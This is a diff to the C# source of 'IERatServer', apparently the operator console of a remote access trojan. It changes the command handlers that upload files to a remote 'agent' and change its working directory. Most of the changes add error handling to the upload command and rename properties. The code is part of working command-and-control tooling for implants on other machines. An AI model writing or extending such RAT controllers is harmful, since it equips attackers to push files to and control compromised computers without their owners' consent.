@@ -318,22 +318,33 @@ namespace IERatServer
             public string RemotePath { get; set; }
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
-                if (File.Exists(FileUploadPath))
+                try
                 {
-                    if (RemotePath == null) { RemotePath = FileUploadPath; }
-                    var FileBytes = File.ReadAllBytes(FileUploadPath);
-                    var payload = Convert.ToBase64String(ServerUtils.Compress(FileBytes));
-                    AddTaskToActiveAgent("upload", payload + ":::" + RemotePath);
-                    return Task.FromResult(CommandResult.Success);
+                    if (File.Exists(FileUploadPath))
+                    {
+                        if (RemotePath == null) { RemotePath = FileUploadPath; }
+                        var FileBytes = File.ReadAllBytes(FileUploadPath);
+                        var payload = Convert.ToBase64String(ServerUtils.Compress(FileBytes));
+                        AddTaskToActiveAgent("upload", payload + ":::" + RemotePath);
+                        return Task.FromResult(CommandResult.Success);
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = Color.Blue;
+                        Console.WriteLine($"Error - File not found.\n");
+                        Console.ForegroundColor = Color.White;
+                        //loop._client.DisplayPrompt();
+                        return Task.FromResult(CommandResult.Success);
+                    }
                 }
-                else
+                catch (Exception ex)
                 {
-                    Console.ForegroundColor = Color.LightBlue;
-                    Console.WriteLine($"\nError - File not found.\n");
+                    Console.ForegroundColor = Color.Blue;
+                    Console.WriteLine($"\n{ex.Message}");
                     Console.ForegroundColor = Color.White;
-                    //loop._client.DisplayPrompt();
-                    return Task.FromResult(CommandResult.Success);
+                    return Task.FromResult(CommandResult.RuntimeFailure);
                 }
+
             }
         }
 
@@ -349,10 +360,10 @@ namespace IERatServer
         class TimeoutCommand : Command
         {
             [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the number of seconds")]
-            public int seconds { get; set; }
+            public int Seconds { get; set; }
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
-                TimeOutSeconds = seconds;
+                TimeOutSeconds = Seconds;
                 return Task.FromResult(CommandResult.Success);
             }
         }
@@ -360,10 +371,10 @@ namespace IERatServer
         class cdCommand : Command
         {
             [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a directory path")]
-            public string directory { get; set; }
+            public string Directory { get; set; }
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
-                AddTaskToActiveAgent("cd", directory);
+                AddTaskToActiveAgent("cd", Directory);
                 return Task.FromResult(CommandResult.Success);
             }
         }
